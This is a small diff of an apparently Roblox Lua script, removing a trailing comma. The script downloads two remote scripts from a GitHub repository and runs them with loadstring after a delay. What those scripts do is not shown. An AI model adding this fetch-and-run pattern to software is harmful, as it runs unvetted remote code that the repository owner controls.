@@ -8,6 +8,6 @@ task.delay(5, function()
         player.CharacterAdded:Wait()
     end
 
-    pcall(loadstring(game:HttpGet("https://raw.githubusercontent.com/S-J-090/white-list/refs/heads/main/say"))),
+    pcall(loadstring(game:HttpGet("https://raw.githubusercontent.com/S-J-090/white-list/refs/heads/main/say")))
     pcall(loadstring(game:HttpGet("https://raw.githubusercontent.com/S-J-090/white-list/refs/heads/main/gex")))
 end)
